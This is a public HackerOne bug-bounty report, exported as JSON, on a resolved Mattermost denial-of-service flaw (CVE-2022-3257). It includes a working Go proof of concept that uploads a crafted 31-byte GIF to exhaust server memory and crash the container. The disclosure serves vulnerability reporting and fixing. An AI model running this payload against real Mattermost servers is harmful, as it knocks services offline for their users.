{
  "id": 1620170,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjIwMTcw",
  "url": "https://hackerone.com/reports/1620170",
  "title": "DOS: out of memory from gif through upload api",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2022-06-30T09:41:37.470Z",
  "submitted_at": "2022-06-30T09:41:37.544Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "catenacyber",
    "url": "/catenacyber",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35268,
    "url": "https://hackerone.com/mattermost",
    "handle": "mattermost",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/268/9c24022b929e7fae94799068cf956f5c69d3ea15_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/268/9c24022b929e7fae94799068cf956f5c69d3ea15_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Mattermost",
      "twitter_handle": "Mattermost",
      "website": "https://mattermost.com",
      "about": "Open-source collaboration, self-managed or SaaS"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2022-3257"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2022-09-21T08:49:00.175Z",
  "bug_reporter_agreed_on_going_public_at": "2022-08-22T08:48:39.163Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nWhen sending a specially crafted gif with max dimensions through the upload API, we get Mattermost server to consume more than 4Gbytes of RAM\n\n## Steps To Reproduce:\n[add details for how we can reproduce the issue]\n\n  1. Run `docker run --name mattermost-preview -d --publish 8065:8065 mattermost/mattermost-preview -m=4G` as documented https://docs.mattermost.com/guides/deployment.html with 4G limit from https://docs.mattermost.com/install/software-hardware-requirements.html#hardware-requirements-for-team-deployments\n  1. Get one channel id\n  1. Run this simple POC below with a valid channel id\n  1. Docker container gets killed\n\n```\npackage main\n\nimport (\n\t\"bytes\"\n\t\"fmt\"\n\t\"github.com/mattermost/mattermost-server/v5/model\"\n)\n\nfunc main() {\n\tClient := model.NewAPIv4Client(\"http://localhost:8065/\")\n\tClient.Login(\"toto\", \"tototo\")\n\tus := &model.UploadSession{\n\t\tChannelId: \"5dtj9hf89ifap8imigbzjc7wjo\",\n\t\tFilename:  \"oom.gif\",\n\t\tFileSize:  31,\n\t}\n\tus, response := Client.CreateUpload(us)\n\tfmt.Printf(\"lol %s %#+v\\n\", us, response)\n\tdata := []byte{0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x2e, 0xf8, 0xff, 0xff, 0xf, 0x18, 0x18, 0x2c, 0x7f, 0x20, 0x0, 0x0, 0x0, 0xa0, 0xff, 0xff, 0xff, 0xd4, 0x9a, 0xf0, 0xb4, 0x8, 0x35, 0x4, 0x0}\n\tinfo, err2 := Client.UploadData(us.Id, bytes.NewReader(data))\n\tfmt.Printf(\"lol %s %#+v\\n\", err2, info)\n}\n```\n\nThis happens with `gif.DecodeAll` being called by `GetInfoForBytes` getting called by `App.UploadData` being called by `doUploadData` being called by `uploadData` without any call to `preprocessImage` as is done in the `api/v4/files` route\n\nDocker container gets killed\n\n## Impact\n\nCrash a server",
  "bounty_amount": "150.0",
  "formatted_bounty": "$150",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2022-09-21T08:48:39.263Z",
  "allow_singular_disclosure_after": -44084338.38581934,
  "singular_disclosure_allowed": true,
  "vote_count": 11,
  "voters": [
    "shreyaschavhan",
    "zy9ard3",
    "thruster",
    "dilawer",
    "cametome006",
    "f1ras",
    "khizer47",
    "shivammusic",
    "huh0x_",
    "shohag_sp",
    "and 1 more..."
  ],
  "severity": {
    "rating": "low",
    "score": 3.1,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "none",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 17022,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "mattermost/mattermost-server",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
